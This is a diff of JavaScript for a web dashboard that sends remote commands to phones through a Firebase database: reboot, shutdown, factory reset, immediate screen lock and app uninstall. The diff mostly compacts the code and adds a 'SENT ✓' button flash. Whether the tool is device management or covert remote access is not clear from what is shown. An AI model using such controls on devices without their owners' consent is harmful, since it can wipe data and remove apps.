-            if (confirm("⚠️ REBOOT DEVICE? This will restart the phone immediately.")) {
-                sendRemoteCommand(deviceUid, 'reboot_device', true);
-            }
-        };
-    }
-
-    const shutdownBtn = document.getElementById('cmd-shutdown');
-    if (shutdownBtn) {
-        shutdownBtn.onclick = () => {
-            if (confirm("⚠️ SHUTDOWN DEVICE? This will power off the phone.")) {
-                sendRemoteCommand(deviceUid, 'shutdown_device', true);
-            }
-        };
-    }
-
-    const factoryBtn = document.getElementById('cmd-factory');
-    if (factoryBtn) {
-        factoryBtn.onclick = () => {
-            if (confirm("🚨 FACTORY RESET? This will ERASE ALL DATA on the device. THIS CANNOT BE UNDONE!")) {
-                if (confirm("Are you ABSOLUTELY sure?")) {
-                    sendRemoteCommand(deviceUid, 'factory_reset', true);
-                }
-            }
-        };
-    }
-
-    const lockNowBtn = document.getElementById('cmd-locknow');
-    if (lockNowBtn) {
-        lockNowBtn.onclick = () => {
-            if (confirm("🔒 Lock the screen immediately?")) {
-                sendRemoteCommand(deviceUid, 'lock_screen_now', true);
-            }
-        };
-    }
-
-    const uninstallBtn = document.getElementById('cmd-uninstall');
-    if (uninstallBtn) {
-        uninstallBtn.onclick = () => {
-            const pkg = prompt("Enter package name to uninstall (e.g., com.whatsapp):");
-            if (pkg) sendRemoteCommand(deviceUid, 'uninstall_app', pkg);
-        };
-    }
+    // Danger zone
+    const rb = document.getElementById('cmd-reboot');
+    if(rb) rb.onclick = () => { if(confirm("⚠️ REBOOT DEVICE?")) sendCmd(uid,'reboot_device',true); };
+    const sdb = document.getElementById('cmd-shutdown');
+    if(sdb) sdb.onclick = () => { if(confirm("⚠️ SHUTDOWN DEVICE?")) sendCmd(uid,'shutdown_device',true); };
+    const fb = document.getElementById('cmd-factory');
+    if(fb) fb.onclick = () => { if(confirm("🚨 FACTORY RESET? ERASE ALL DATA?")){if(confirm("ABSOLUTELY sure?")) sendCmd(uid,'factory_reset',true);} };
+    const lnb = document.getElementById('cmd-locknow');
+    if(lnb) lnb.onclick = () => { if(confirm("🔒 Lock screen now?")) sendCmd(uid,'lock_screen_now',true); };
+    const ub = document.getElementById('cmd-uninstall');
+    if(ub) ub.onclick = () => { const p=prompt("Package name to uninstall:"); if(p) sendCmd(uid,'uninstall_app',p); };
 }
 
-// Helper: Setup toggle button
-function setupToggle(btnId, deviceUid, command, offCommand) {
-    const btn = document.getElementById(btnId);
-    if (!btn) return;
-    btn.onclick = () => {
-        const isActive = btn.classList.contains("active");
-        if (offCommand && isActive) {
-            sendRemoteCommand(deviceUid, offCommand, true);
-        } else {
-            sendRemoteCommand(deviceUid, command, !isActive);
-        }
-    };
+function setupToggle(btnId, uid, cmd, offCmd) {
+    const btn = document.getElementById(btnId); if(!btn) return;
+    btn.onclick = () => { const active=btn.classList.contains("active"); if(offCmd&&active) sendCmd(uid,offCmd,true); else sendCmd(uid,cmd,!active); };
 }
 
-// Helper: Setup trigger button
-function setupTrigger(btnId, deviceUid, command) {
-    const btn = document.getElementById(btnId);
-    if (!btn) return;
+// FIXED: Trigger button with 2s green flash + "SENT ✓"
+function setupTrigger(btnId, uid, cmd) {
+    const btn = document.getElementById(btnId); if(!btn) return;
     btn.onclick = () => {
-        sendRemoteCommand(deviceUid, command, true);
+        sendCmd(uid, cmd, true);
         btn.style.background = '#00ff88';
         btn.style.color = '#000';
-        setTimeout(() => { btn.style.background = ''; btn.style.color = ''; }, 500);
+        btn.style.borderColor = '#00ff88';
+        btn.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.5)';
+        const s = btn.querySelector('.toggle-state');
+        if(s){s.textContent='SENT ✓';s.style.color='#000';s.style.fontWeight='bold';}
+        setTimeout(()=>{btn.style.background='';btn.style.color='';btn.style.borderColor='';btn.style.boxShadow='';if(s){s.textContent='TRIGGER';s.style.color='#666';s.style.fontWeight='normal';}},2000);
     };
 }
 
 // ==========================================
 // UTILITIES
 // ==========================================
-function sendRemoteCommand(deviceUid, commandName, value) {
-    console.log(`📤 Command: ${commandName} = ${value}`);
-    update(ref(database, `devices/${deviceUid}/commands`), { [commandName]: value });
-}
+function sendCmd(uid, cmd, val) { console.log(`📤 ${cmd} = ${val}`); update(ref(database,`devices/${uid}/commands`),{[cmd]:val}); }
 
 function updateButtonState(btnId, isActive) {
-    const btn = document.getElementById(btnId);
-    if (!btn) return;
-
+    const btn = document.getElementById(btnId); if(!btn) return;
     btn.classList.toggle('active', !!isActive);
-
-    const stateEl = btn.querySelector('.toggle-state');
-    if (stateEl) {
-        if (stateEl.textContent === 'REC' || stateEl.textContent === 'UPD...' || stateEl.textContent.startsWith('SEG')) return;
-        stateEl.textContent = isActive ? 'ON' : 'OFF';
-        stateEl.style.color = isActive ? '#00ff88' : '#666666';
-        stateEl.style.fontWeight = isActive ? 'bold' : 'normal';
-    }
-
-    btn.style.borderColor = isActive ? '#00ff88' : '#333333';
+    const s = btn.querySelector('.toggle-state');
+    if(s){if(s.textContent==='REC'||s.textContent==='UPD...'||s.textContent.startsWith('SEG')||s.textContent==='SENT ✓') return; s.textContent=isActive?'ON':'OFF'; s.style.color=isActive?'#00ff88':'#666'; s.style.fontWeight=isActive?'bold':'normal';}
+    btn.style.borderColor = isActive ? '#00ff88' : '#333';
     btn.style.opacity = isActive ? '1' : '0.7';
 }
 
-function formatTime(timestamp) {
-    if (!timestamp) return '--';
-    return new Date(timestamp).toLocaleString();
-}
+function fmtTime(ts) { return ts ? new Date(ts).toLocaleString() : '--'; }
+function fmtSize(b) { if(!b) return '0 B'; if(b<1024) return b+' B'; if(b<1048576) return (b/1024).toFixed(1)+' KB'; if(b<1073741824) return (b/1048576).toFixed(1)+' MB'; return (b/1073741824).toFixed(2)+' GB'; }
+function esc(t) { if(!t) return ''; const d=document.createElement('div'); d.textContent=t; return d.innerHTML; }
+function showNoDeviceAlert() { noDeviceAlert.style.display='flex'; deviceDashboard.style.display='none'; }
 
-function formatSize(bytes) {
-    if (!bytes) return '0 B';
-    if (bytes < 1024) return bytes + ' B';
-    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
-    if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
-    return (bytes / 1073741824).toFixed(2) + ' GB';
-}
-
-function escapeHtml(text) {
-    if (!text) return '';
-    const div = document.createElement('div');
-    div.textContent = text;
-    return div.innerHTML;
-}
-
-function showNoDeviceAlert() {
-    noDeviceAlert.style.display = 'flex';
-    deviceDashboard.style.display = 'none';
-}
-
-if (logoutBtn) {
-    logoutBtn.addEventListener('click', () => signOut(auth).then(() => window.location.href = './index.html'));
-}
-
-if (refreshDevicesBtn) {
-    refreshDevicesBtn.addEventListener('click', loadAllDevices);
-}
+if(logoutBtn) logoutBtn.addEventListener('click',()=>signOut(auth).then(()=>window.location.href='./index.html'));
+if(refreshDevicesBtn) refreshDevicesBtn.addEventListener('click',loadAllDevices);
